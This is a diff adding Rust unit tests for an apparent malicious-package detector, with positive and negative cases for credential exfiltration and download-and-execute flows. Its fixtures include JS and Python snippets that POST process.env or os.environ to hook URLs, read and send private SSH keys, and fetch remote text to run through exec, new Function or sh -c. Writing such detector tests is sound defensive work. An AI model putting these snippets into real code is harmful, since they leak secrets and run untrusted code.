+            ("e.js", "const hook = 'http://127.0.0.1:4317/hook';\nawait fetch(hook, { method: 'POST', body: JSON.stringify(process.env) });\n"),
+            ("f.js", "await fetch('http://localhost.example.net/hook', { method: 'POST', body: JSON.stringify(process.env) });\n"),
+            ("g.py", "requests.post('http://127.0.0.1:80@example.net/x', json=dict(os.environ))\n"),
+        ] {
+            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
+        }
+    }
+
+    #[test]
+    fn a_public_key_or_the_ssh_config_is_not_a_secret() {
+        for (path, src) in [
+            ("a.py", "ssh_dir = os.path.join(home, \".ssh\")\nkey = os.path.join(ssh_dir, \"id_ed25519\")\nsubprocess.run([\"ssh-keygen\", \"-f\", key])\npub = open(key + \".pub\").read()\nrequests.post(api, json={\"key\": pub})\n"),
+            ("b.js", "const sshDir = path.join(os.homedir(), '.ssh');\nconst pub = fs.readFileSync(path.join(sshDir, 'id_ed25519.pub'), 'utf8');\nfetch(api, { method: 'POST', body: JSON.stringify({ pub }) });\n"),
+            ("c.py", "cfg = open(os.path.join(home, \".ssh\", \"config\")).read()\nrequests.post(api, json={\"hosts\": cfg})\n"),
+            ("d.py", "cfg = open(os.path.expanduser(\"~/.ssh/config\")).read()\nrequests.post(api, json={\"hosts\": cfg})\n"),
+            ("e.py", "ssh = Path.home() / \".ssh\"\nhosts = (ssh / \"known_hosts\").read_text()\nrequests.post(api, json={\"hosts\": hosts})\n"),
+        ] {
+            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
+        }
+        for (path, src) in [
+            ("f.py", "d = os.path.join(home, \".ssh\")\ndata = {}\nfor f in os.listdir(d):\n    data[f] = open(os.path.join(d, f)).read()\nrequests.post(u, json=data)\n"),
+            ("g.py", "d = os.path.join(home, \".ssh\")\ndata = {f: open(os.path.join(d, f)).read() for f in os.listdir(d) if f not in (\"config\", \"known_hosts\")}\nrequests.post(u, json={\"config\": cfg, \"keys\": data})\n"),
+            ("h.js", "const dir = path.join(os.homedir(), '.ssh');\nconst key = fs.readFileSync(path.join(dir, 'id_ed25519'), 'utf8');\nfetch(u, { method: 'POST', body: key });\n"),
+            ("i.py", "for name in [\"id_rsa\", \"id_rsa.pub\", \"config\"]:\n    found[name] = open(os.path.join(home, \".ssh\", name)).read()\nrequests.post(u, json=found)\n"),
+        ] {
+            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
+        }
+    }
+
+    #[test]
+    fn a_status_an_option_or_a_version_is_not_downloaded_code() {
+        for (path, src) in [
+            // The status of a response, not its body.
+            ("a.js", "const r = await fetch(u);\nconst up = r.status < 500;\nexecSync(up ? 'service x reload' : 'service x restart');\n"),
+            ("b.js", "const ok = (await fetch(u)).ok;\nexecSync(ok ? 'true' : 'false');\n"),
+            ("c.py", "r = requests.get(u)\nalive = r.status_code == 200\nos.system('start' if alive else 'stop')\n"),
+            // Data for the process, not its command.
+            ("d.js", "const body = await (await fetch(u)).text();\nspawnSync('python3', ['-c', PARSER], { input: body, encoding: 'utf8' });\n"),
+            ("e.py", "r = requests.get(u)\nsubprocess.run(['python3', '-c', PARSER], input=r.text)\n"),
+            // A self-update.
+            ("f.js", "const latest = (await (await fetch(REG)).json()).version;\nspawnSync('npm', ['install', '-g', `pkg@${latest}`], { shell: true });\n"),
+            ("g.js", "const latest = (await (await fetch(REG)).json()).version;\nexecSync(`npm install -g pkg@${latest}`);\n"),
+            ("h.py", "v = requests.get(PYPI).json()['info']['version']\nsubprocess.run(f'pip install pkg=={v}', shell=True)\n"),
+        ] {
+            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
+        }
+        for (path, src) in [
+            ("i.js", "const data = await (await fetch(u)).json();\nspawn('sh', ['-c', data.command]);\n"),
+            ("j.js", "const r = await fetch(u);\nconst body = r.status === 200 ? await r.text() : '';\nexecSync(body);\n"),
+            ("k.py", "resp = requests.get(u)\nexec(resp.text)\n"),
+            ("l.js", "const code = await (await fetch(u)).text();\nnew Function(code)();\n"),
+            ("m.js", "const body = await (await fetch(u)).text();\nspawnSync('sh', ['-c', body], { stdio: 'inherit' });\n"),
+            ("n.py", "r = requests.get(u)\nsubprocess.run(args=r.text, shell=True)\n"),
+            ("o.js", "const data = await (await fetch(u)).json();\nspawnSync('npm', ['install', data.pkg], { shell: true });\n"),
+        ] {
+            assert_eq!(names(path, src), vec![DOWNLOAD_EXECUTE], "{path}");
+        }
     }
 
     /// The clean packages the first version flagged (playwright,
